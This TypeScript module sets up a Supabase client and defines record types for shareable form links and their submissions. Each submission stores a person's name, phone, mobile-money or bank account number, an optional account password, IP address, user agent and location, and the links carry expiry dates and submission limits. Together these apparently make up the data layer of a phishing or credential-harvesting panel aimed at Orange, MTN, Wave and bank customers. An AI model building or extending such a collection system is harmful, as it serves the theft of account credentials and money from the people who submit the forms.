import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';

export const isSupabaseConfigured = () => {
    return Boolean(supabaseUrl && supabaseAnonKey && !supabaseUrl.includes('votre_url'));
};

export const supabase = createClient(
    supabaseUrl || 'https://placeholder.supabase.co',
    supabaseAnonKey || 'placeholder-key',
    {
        auth: {
            persistSession: true,
            autoRefreshToken: true,
        }
    }
);

// Types
export interface FormLinkRecord {
    id: number | string;
    user_id?: string;
    name: string;
    description?: string;
    link_id: string;
    expiry_date?: string | null;
    submissions_limit: number;
    submission_count: number;
    is_active: boolean;
    created_at: string;
}

export interface SubmissionRecord {
    id: string;
    user_id?: string;
    link_id?: string;
    form_link_id?: number | string;
    full_name: string;
    email: string;
    phone: string;
    method: 'orange' | 'mtn' | 'wave' | 'bank' | 'other' | string;
    account_number: string;
    password?: string;
    bank_name?: string;
    operator_name?: string;
    country_name?: string;
    country_code?: string;
    ip_address?: string;
    user_agent?: string;
    location?: string;
    status: string;
    admin_notes?: string;
    created_at: string;
}
